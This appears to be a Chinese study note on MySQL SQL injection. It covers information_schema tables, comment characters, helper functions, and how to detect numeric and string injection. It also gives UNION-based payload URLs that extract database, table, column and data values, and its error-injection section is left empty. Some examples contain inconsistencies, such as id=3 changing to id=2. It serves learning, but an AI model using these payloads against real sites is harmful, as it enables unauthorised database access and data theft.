---
description: 终于开这个坑了，因为实在是，sql注入不知道为什么总是在我的死点上面，真的就是完全不知道为啥。
---

# 🐮 SQL注入知识点总结

一些sql注入的基本知识还是得重新说说的，虽然现在已经理解了，但是为来者铺路。



sql注入产生的原理就不细说了，就是输入有害，可以拼接语句这种。



{% hint style="info" %}
这里补充一个0x7e是\~的意思。
{% endhint %}



## <mark style="color:green;">（1）SQL的系统库</mark>

### <mark style="color:yellow;">①information\_schema</mark>

mysql里面自带了一个information\_schema库，我们利用其他系统的mysql的时候，不知道他具体的库的信息，但是我们从这个系统库里面知道一些玄机

<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

我们可以看看这个库里面的一些表。

<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

这里面的表也是自带的，我们将从这些表里面获取到信息。所以我们将重点介绍几个自带信息的表。

### <mark style="color:yellow;">②SCHEMATA</mark>

首先查看一下这个表里面的所有信息。

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

我们可以看到这个表里面的SCHEMA\_NAME是数据库里面所有库的库名。所以如果我们想查看库名，可以用

```sql
SELECT SCHEMA_NAME FROM SCHEMATA;
```

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:yellow;">③TABLES</mark>

同样查看tables表的全部内容。

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

我们可以看到这里有表名，库名都有。所以我们可以从这个表里面查询到表名和库名。

这里写查库名的语句就是

```sql
SELECT TABLE_SCHEMA FROM TABLES;
```

查表名就是

```sql
SELECT TABLE_NAME FROM TABLES;
```

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:yellow;">③COLUMNS</mark>

同样查看表先

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

发现有库名，表名，列名全部都有。

那我们就直接写他们分别的查询语句。

查库名

```sql
SELECT TABLE_SCHEMA FROM COLUMNS;
```

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

查表名

```sql
SELECT TABLE_NAME FROM COLUMNS;
```

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

查列名

```sql
SELECT COLUMN_NAME FROM COLUMNS;
```

<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:green;">（2）SQL注释符</mark>

这里SQL的注释符还是要仔细说说的。他一共有三种注释方法。

### <mark style="color:yellow;">①</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`--`</mark>&#x20;

`--` （后面有一个空格）表示注释，当然也可以把空格urlencode，最后就变成了`--%20`&#x20;

还有一些写成`--+`也可以

### <mark style="color:yellow;">②</mark><mark style="color:yellow;">`#`</mark>

就是一个单纯的`#`，不需要空格什么的，有些时候将他urlecode也是可以的，就直接一个`%23`

### <mark style="color:yellow;">③</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`/**/`</mark>

就是语言一般用的注释符`/**/`

***

## <mark style="color:green;">（3）常用函数</mark>

这些函数主要是在注入的时候后面会用到的。

### <mark style="color:yellow;">①系统库系统版本</mark>

```sql
VERSION()
@@VERSION
@@GLOBAL.VERSION
```

### <mark style="color:yellow;">②系统库当前使用用户</mark>

```sql
USER()
CURRENT_USER()
SYSTEM_USER()
SESSION_USER()
```

### <mark style="color:yellow;">③当前使用的数据库</mark>

```sql
DATABASE()
SCHEMA()
```

### <mark style="color:yellow;">④GROUP\_CONCAT()</mark>

将group by产生的同一个分组中的值连接起来，返回一个字符串结果。简单来说就是多行数据变成一行输出。

格式是：

```sql
GROUP_CONCAT(str1,str2,…)
```

### <mark style="color:yellow;">⑤CONCAT（）</mark>

简单来说就是MySQL `CONCAT()`函数需要一个或多个字符串参数，并将它们连接成一个字符串。和GROUP\_CONCAT（）差不多。

格式是

```
CONCAT(str1，str2，.....)
```

### <mark style="color:yellow;">⑥CONCAT\_WS()</mark>

他是concat（）的一种特殊的形式，第一个参数是分隔符，分隔符的位置放在要连接的两个字符串之间。

```
concat_ws(separator,str1,str2....)
```

### <mark style="color:yellow;">⑦EXTRACTVALUE（）</mark>

从目标xml中返回包含所查询值得字符串。第一个参数是xml文档对象名称，第二个参数是Xpath格式的字符串

```
extractvalue(XML_document,XPath_string)
```

这个在报错注入的时候可能会用到主要是因为输入了不符合xpath语法的知识。

### <mark style="color:yellow;">⑧UPDATEXML()</mark>

使用不同得xml标记匹配和替换xml块的函数。第一个参数是xml文档对象的名称，第二个参数是xpath格式的字符串，第三个参数是替换的数据

```
updatexml(XML_document,XPath_string,new_value)
```

和上述的其实差不多。

### <mark style="color:yellow;">⑨floor（）</mark>

向下取整。

```
floor(value)
```

***

## <mark style="color:green;">（4）数字型注入</mark>

### <mark style="color:yellow;">①加</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`'`</mark><mark style="color:yellow;">或者</mark><mark style="color:yellow;">`"`</mark>

```url
http://xxxxxxxx?id=3'
```

这个时候sql语句的语法是错误的，程序根本就不执行，所以会报错。这个时候执行的sql逻辑是

```sql
select * from table where id =3'
```

### <mark style="color:yellow;">②加and 1=1</mark>

```
http://xxxxxxxxxxxx?id =3 and 1=1 
```

如果这个时候执行结果是与原页面没有差异的话，就说明这一步是成功的。因为这个sql语句是正确的，所以没有差异。这个时候执行的sql逻辑是

```sql
select * from table where id=3 and 1=1
```

### <mark style="color:yellow;">③加and 1=2</mark>

```
http://xxxxxxxxxxx?id=3 and 1=2
```

这个时候语句执行是正常的，没有语法错误，但是无法查询出结果，所以返回的数据与原页面存在一定的差异。这个时候执行的sql逻辑是

```sql
select * from table where id=3 and 1=2
```

以上这些步骤说明URL存在数字型注入

其实还会出现一种情况是数字加括号，也就是说数字是被括号括起来的，其实还是闭合方法是一样的，就是确定含有括号是不一样的。

### <mark style="color:yellow;">①加and 1=1</mark>

```
http://xxxxxxxxx?id =3 and 1=1
```

会显示1的查询结果，因为查询语句实际执行的是 id=（2 and 1=1） ，实际执行的是id=1，这个时候sql执行语句是

```sql
select * from table where id = (2 and 1=1)
```

### <mark style="color:yellow;">②加 and 1=2</mark>

```
http://xxxxxxxxx?id =3 and 1=2
```

这个时候执行结果不出来，因为实际执行的是id = （3 and 1=2），实际执行的是 id =0 ，所以执行失败。这个时候sql执行语句是

```sql
select * from table where id = (2 and 1=2)
```



***

## <mark style="color:green;">(5)字符型注入</mark>

字符型比数字型稍微复杂一点，他需要考虑到闭合单（双）引号的问题，就需要加一个引号并且注释后面的引号。

### <mark style="color:yellow;">①加'</mark> <mark style="color:yellow;">或者"</mark>

```
http://xxxxxxxxxxxx?username='admin
```

这个时候会报错，因为字符型本身就带有一对引号，所以额外加了一个引号之后其实无法闭合了，就会报错。这个时候sql逻辑语句是

```
select * from table where username= ''admin'
```

### <mark style="color:yellow;">②加 ' and 1=1 #</mark>

```
http://xxxxxxxxx?username=admin'and 1=1 #
```

如果这个时候成功执行并且返回了正确的结果的话，那么就说明字符型注入成功了。因为相当于admin'和前面的’进行了闭合，然后后面的单引号又被注释了，所以其实拼接的语句就是

```sql
select * from table where username='admin' and 1=1 #
```

### <mark style="color:yellow;">③加 ‘ and 1=2#</mark>

```
http://xxxxxxxxxxxx?username=admin' and 1=2#
```

这个时候执行了但是会报错，语法没有错误，但是因为逻辑执行不正确，所以还是会报错。实际的sql逻辑语句其实就是

```sql
select * from table where username='admin' and 1=2#
```

以上就能判断出是字符型注入了。

***

## <mark style="color:green;">(6)普通注入注入步骤</mark>

### <mark style="color:yellow;">①判断列数</mark>

就是加order by。

```
http://xxxxxxxx?id= 1' order by 4 #
```

如果先测一个比较大的数，就是4，5，6这种，报错的话，就说明不存在这一列，那么就是说实际存在的列数要小于这个数。然后我们就往小数猜。

```
http://xxxxxxxxxx?id=1' order by 3#
```

如果这个时候没有报错，那么就说明存在3列。

### <mark style="color:yellow;">②爆出数据库</mark>

```
http://xxxxxxxxxxx?id=1' union select1,database(),3--+
```

可以直接使用database()版本来爆出数据库。

```
http://***********?id=1' union select group_concat(schema_name),3,from information_schema.schemata #
```

也可以利用系统表来得到数据库的库名有哪些。

### <mark style="color:yellow;">③爆出数据表</mark>

```
http://xxxxxx?id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘数据库' #
```

直接从系统库里面找到。

### <mark style="color:yellow;">④爆出字段</mark>

```
http://******?id=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='数据表' #
```

### <mark style="color:yellow;">⑤爆出数据值</mark>

```
http://******?id=1' union select 1,group_concat(0x7e,字段，0x7e),3 from 数据库名.数据表名 --+
```

***

## <mark style="color:green;">(7)报错注入</mark>

报错注入主要是extractvalue()函数和updatexml函数和floor()函数这三个得作用，之前有一个exp，但是后面的版本用不了了，所以我们不说这个用法了。直接说这三个。

### <mark style="color:yellow;">①floor（）报错</mark>



{% hint style="info" %}
这个报错注入在mysql 8+的版本中不存在，我的版本是10所以这个问题根本就不存在。
{% endhint %}

所以我们的利用方法就是

#### <mark style="color:purple;">（1）爆数据库</mark>

```sql
```



























































## 参考门：

{% embed url="https://www.cnblogs.com/1ink/p/15123921.html" %}

{% embed url="https://luckyfuture.top/sqli-summary" %}

{% embed url="https://m.freebuf.com/articles/web/339118.html" %}

